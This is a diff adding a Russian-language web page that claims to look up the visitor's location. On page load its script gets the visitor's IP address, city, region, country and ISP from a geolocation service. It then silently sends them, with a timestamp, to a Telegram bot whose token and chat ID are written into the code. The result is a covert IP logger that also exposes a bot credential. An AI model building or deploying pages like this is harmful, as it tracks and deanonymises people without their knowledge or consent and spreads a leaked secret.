@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Определение местоположения</title>
+</head>
+<body>
+  <h2>Ищу местоположение по IP...</h2>
+  <p id="status">Пожалуйста, подождите...</p>
+
+  <script>
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const message = `
+IP: ${data.ip}
+Город: ${data.city}
+Регион: ${data.region}
+Страна: ${data.country_name}
+Провайдер: ${data.org}
+Время: ${new Date().toLocaleString()}
+        `;
+        document.getElementById("status").innerText = message;
+
+        // Отправка в Telegram через Webhook
+        fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: 490491527,
+            text: message
+          })
+        });
+      })
+      .catch(err => {
+        document.getElementById("status").innerText = "Ошибка: не удалось получить местоположение.";
+        console.error(err);
+      });
+  </script>
+</body>
+</html>
